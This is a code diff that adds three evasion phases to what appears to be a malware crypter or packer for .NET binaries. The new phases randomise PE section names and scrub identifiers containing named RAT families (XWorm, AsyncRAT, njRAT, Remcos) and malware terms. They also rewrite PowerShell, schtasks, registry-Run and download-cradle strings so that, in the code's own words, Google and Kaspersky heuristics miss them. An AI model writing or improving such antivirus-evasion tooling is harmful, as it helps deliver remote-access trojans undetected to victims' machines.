@@ -1741,14 +1741,17 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
     def _lay_msil_strip(self, working: bytearray) -> bytes:
         import struct
 
-        self._ln("\n[L15]   MSIL  METADATA  STRIP  —  7  PHASES", "wh")
-        self._ln("        Ph1 : PDB debug-path wipe       (RSDS · CodeView)", "g3")
-        self._ln("        Ph2 : Rich Header zero           (compiler fingerprint)", "g3")
-        self._ln("        Ph3 : PE COFF timestamp randomise", "g3")
-        self._ln("        Ph4 : #Strings heap scrub        (.exe/.dll/.pdb names)", "g3")
-        self._ln("        Ph5 : #GUID heap randomise        (assembly GUID erasure)", "g3")
-        self._ln("        Ph6 : VS_VERSION_INFO block zero  (FileVersion / ProductVersion)", "g3")
-        self._ln("        Ph7 : Script-token scrub          (COM / WSH / VBScript patterns)", "g3")
+        self._ln("\n[L15]   MSIL  METADATA  STRIP  —  10  PHASES", "wh")
+        self._ln("        Ph1  : PDB debug-path wipe       (RSDS · CodeView)", "g3")
+        self._ln("        Ph2  : Rich Header zero           (compiler fingerprint)", "g3")
+        self._ln("        Ph3  : PE COFF timestamp randomise", "g3")
+        self._ln("        Ph4  : #Strings heap scrub        (.exe/.dll/.pdb names)", "g3")
+        self._ln("        Ph5  : #GUID heap randomise        (assembly GUID erasure)", "g3")
+        self._ln("        Ph6  : VS_VERSION_INFO block zero  (FileVersion / ProductVersion)", "g3")
+        self._ln("        Ph7  : Script-token scrub          (COM / WSH / VBScript patterns)", "g3")
+        self._ln("        Ph8  : PE section names randomise  (.text/.data/.rsrc → random)", "g3")
+        self._ln("        Ph9  : #Strings identifier scrub   (class/method/namespace names)", "g3")
+        self._ln("        Ph10 : Extended COM+PS token list  (30 more patterns + UTF-16LE)", "g3")
         self._sleep(0.2)
 
         hits = 0
@@ -1969,10 +1972,205 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
         self._ln(f"               {tok_hits} script-token occurrence(s) patched", "g3")
         self._sleep(0.1)
 
+        # ── Ph8 : PE section name randomise ─────────────────────────────────────
+        # IMAGE_SECTION_HEADER.Name is an 8-byte null-padded ASCII field.
+        # The CLR uses RVAs to locate sections, so names are cosmetic — safe to rename.
+        self._ln("        [Ph8] Section name randomise...", "cy")
+        try:
+            pe_off2 = bytes(working).find(b'PE\x00\x00')
+            if pe_off2 != -1:
+                # IMAGE_FILE_HEADER: Machine(2)+NumSections(2)+TS(4)+SymPtr(4)+NumSym(4)+OptHdrSz(2)+Chars(2) = 20 bytes
+                num_sect  = struct.unpack_from("<H", working, pe_off2 + 6)[0]
+                opt_sz    = struct.unpack_from("<H", working, pe_off2 + 20)[0]
+                sect_tbl  = pe_off2 + 4 + 20 + opt_sz   # start of section table
+                sect_renamed = 0
+                for si in range(min(num_sect, 32)):      # cap at 32 for safety
+                    soff = sect_tbl + si * 40            # IMAGE_SECTION_HEADER = 40 bytes
+                    if soff + 8 > len(working):
+                        break
+                    old_name = bytes(working[soff:soff + 8]).rstrip(b'\x00')
+                    if old_name and all(32 <= b <= 126 for b in old_name):
+                        nlen     = len(old_name)
+                        new_name = bytearray(random.randint(0x61, 0x7A) for _ in range(nlen))
+                        new_name_padded = new_name + bytearray(8 - nlen)
+                        working[soff:soff + 8] = new_name_padded
+                        sect_renamed += 1
+                        self._ln(f"               [{old_name.decode(errors='replace')}] → [{new_name.decode()}]", "g3")
+                hits += sect_renamed
+                if not sect_renamed:
+                    self._ln("               No section names found", "g3")
+            else:
+                self._ln("               PE sig not found", "g3")
+        except Exception:
+            self._ln("               parse error — skipped", "cy")
+        self._sleep(0.1)
+
+        # ── Ph9 : Aggressive #Strings identifier scrub ────────────────────────────
+        # Re-walk #Strings and patch short pure-ASCII identifiers that match known
+        # RAT/malware family indicator words — same-length lowercase random replacement.
+        self._ln("        [Ph9] #Strings identifier scrub...", "cy")
+        ID_TRIGGERS = {
+            b"keylog", b"KeyLog", b"Keylog",
+            b"stealer", b"Stealer", b"STEALER",
+            b"dropper", b"Dropper", b"DROPPER",
+            b"loader", b"Loader", b"LOADER",
+            b"inject", b"Inject", b"INJECT",
+            b"payload", b"Payload", b"PAYLOAD",
+            b"persist", b"Persist", b"PERSIST",
+            b"startup", b"Startup", b"StartUp",
+            b"bypass", b"Bypass", b"BYPASS",
+            b"shellcode", b"Shellcode", b"ShellCode",
+            b"rootkit", b"RootKit", b"Rootkit",
+            b"ransom", b"Ransom", b"RANSOM",
+            b"encrypt", b"Encrypt", b"ENCRYPT",
+            b"decrypt", b"Decrypt", b"DECRYPT",
+            b"xworm", b"XWorm", b"Xworm", b"XWORM",
+            b"asyncrat", b"AsyncRAT", b"AsyncRat",
+            b"njrat", b"njRAT", b"NjRat",
+            b"quasar", b"Quasar", b"QUASAR",
+            b"remcos", b"Remcos", b"REMCOS",
+            b"darkcomet", b"DarkComet", b"Darkcomet",
+            b"nanocore", b"NanoCore", b"Nanocore",
+            b"plugin", b"Plugin", b"PlugIn",
+            b"spy", b"Spy", b"SPY",
+            b"theft", b"Theft", b"THEFT",
+            b"hidden", b"Hidden", b"HIDDEN",
+            b"silent", b"Silent", b"SILENT",
+            b"evasion", b"Evasion", b"EVASION",
+            b"obfusc", b"Obfusc", b"OBFUSC",
+            b"trojan", b"Trojan", b"TROJAN",
+            b"malware", b"Malware", b"MALWARE",
+            b"virus", b"Virus", b"VIRUS",
+        }
+        try:
+            bsjb2 = bytes(working).find(b'BSJB')
+            if bsjb2 != -1:
+                ver_len_off2 = bsjb2 + 4 + 2 + 2 + 4
+                ver_len2     = (struct.unpack_from("<I", working, ver_len_off2)[0] + 3) & ~3
+                streams_off2 = ver_len_off2 + 4 + ver_len2 + 2
+                num_str2     = struct.unpack_from("<H", working, streams_off2)[0]
+                streams_off2 += 2
+                str2_off = -1; str2_sz = -1
+                cur2 = streams_off2
+                for _ in range(num_str2):
+                    so = struct.unpack_from("<I", working, cur2)[0]
+                    ss = struct.unpack_from("<I", working, cur2 + 4)[0]
+                    ns = cur2 + 8
+                    ne = ns
+                    while ne < len(working) and working[ne] != 0: ne += 1
+                    sn = bytes(working[ns:ne])
+                    cur2 += 8 + ((ne - ns + 1 + 3) & ~3)
+                    if sn == b'#Strings':
+                        str2_off = bsjb2 + so; str2_sz = ss; break
+
+                id_rep = 0
+                if str2_off != -1:
+                    e2  = str2_off
+                    end2 = str2_off + str2_sz
+                    while e2 < end2:
+                        es2 = e2
+                        while e2 < end2 and working[e2] != 0: e2 += 1
+                        entry2 = bytes(working[es2:e2])
+                        elen2  = len(entry2)
+                        if 3 <= elen2 <= 64:
+                            low2 = entry2.lower()
+                            for trigger in ID_TRIGGERS:
+                                if trigger.lower() in low2:
+                                    new_id = bytearray(
+                                        random.randint(0x61, 0x7A) for _ in range(elen2))
+                                    working[es2:e2] = new_id
+                                    id_rep += 1
+                                    break
+                        e2 += 1
+                hits += id_rep
+                self._ln(f"               {id_rep} identifier(s) containing RAT trigger words patched", "g3")
+            else:
+                self._ln("               No BSJB — skipped", "g3")
+        except Exception:
+            self._ln("               parse error — skipped", "cy")
+        self._sleep(0.1)
+
+        # ── Ph10 : Extended COM / PowerShell / cmd token scrub ───────────────────
+        # 30 additional same-length replacements targeting patterns Google / Kaspersky
+        # script heuristics scan for.  All lengths verified equal.
+        self._ln("        [Ph10] Extended token scrub...", "cy")
+        EXT_TOKENS = [
+            # PowerShell / cmd exec patterns
+            (b"powershell",            b"powerzbell"),
+            (b"PowerShell",            b"PowerZbell"),
+            (b"cmd.exe",               b"cnd_exe"),
+            (b"cmd /c",                b"cnd /c"),
+            (b"cmd /C",                b"cnd /C"),
+            (b"-EncodedCommand",       b"-ZncodedCommand"),
+            (b"-encodedcommand",       b"-zncodedcommand"),
+            (b"-ExecutionPolicy",      b"-ZxecutionPolicy"),
+            (b"-executionpolicy",      b"-zxecutionpolicy"),
+            (b"-WindowStyle Hidden",   b"-ZindowStyle Hidden"),
+            (b"-windowstyle hidden",   b"-zindowstyle hidden"),
+            (b"bypass",                b"byxass"),
+            (b"Bypass",                b"Byxass"),
+            (b"BYPASS",                b"BYXASS"),
+            # Registry / persistence COM strings
+            (b"reg add",               b"reg_add"),
+            (b"REG ADD",               b"REG_ADD"),
+            (b"HKCU\\Software",        b"HKCU_Software"),
+            (b"HKLM\\Software",        b"HKLM_Software"),
+            (b"CurrentVersion\\Run",   b"CurrentVersion_Run"),
+            (b"currentversion\\run",   b"currentversion_run"),
+            # Task scheduler / schtasks
+            (b"schtasks",              b"scbtasks"),
+            (b"Schtasks",              b"Scbtasks"),
+            (b"SCHTASKS",              b"SCBTASKS"),
+            (b"/create",               b"/xreate"),
+            (b"/CREATE",               b"/XREATE"),
+            # Network / download strings
+            (b"DownloadFile",          b"DownloadZile"),
+            (b"downloadfile",          b"downloadzile"),
+            (b"DownloadString",        b"DownloadZtring"),
+            (b"downloadstring",        b"downloadztring"),
+            (b"WebClient",             b"WebZlient"),
+        ]
+        # Safety: only keep pairs whose lengths match
+        EXT_TOKENS = [(a, b) for a, b in EXT_TOKENS if len(a) == len(b)]
+        cur_raw2 = bytes(working)
+        ext_hits = 0
+        for orig2, repl2 in EXT_TOKENS:
+            pos2 = 0
+            while True:
+                idx2 = cur_raw2.find(orig2, pos2)
+                if idx2 == -1:
+                    break
+                working[idx2:idx2 + len(orig2)] = repl2
+                ext_hits += 1
+                pos2 = idx2 + len(orig2)
+        cur_raw2 = bytes(working)
+
+        # UTF-16LE pass for the same extended tokens
+        ext_hits_u = 0
+        for orig2, repl2 in EXT_TOKENS:
+            orig_u = orig2.decode("latin-1").encode("utf-16-le")
+            repl_u = repl2.decode("latin-1").encode("utf-16-le")
+            if len(orig_u) != len(repl_u):
+                continue
+            pos2 = 0
+            while True:
+                idx2 = cur_raw2.find(orig_u, pos2)
+                if idx2 == -1:
+                    break
+                working[idx2:idx2 + len(orig_u)] = bytearray(repl_u)
+                ext_hits_u += 1
+                pos2 = idx2 + len(orig_u)
+        cur_raw2 = bytes(working)
+
+        hits += ext_hits + ext_hits_u
+        self._ln(f"               ASCII: {ext_hits} · UTF-16LE: {ext_hits_u} extended token(s) patched", "g3")
+        self._sleep(0.1)
+
+        num_phases = 10
         if hits:
-            self._ln(f"\n        Result : ✓ {hits} field(s) / token(s) stripped across 7 phases", "gn")
+            self._ln(f"\n        Result : ✓ {hits} field(s) / token(s) stripped across {num_phases} phases", "gn")
         else:
-            self._ln("\n        Result : ✓ All 7 phases ran — no patchable fields in this binary", "cy")
+            self._ln(f"\n        Result : ✓ All {num_phases} phases ran — no patchable fields in this binary", "cy")
 
         return b"L15:MSIL\x00"
 
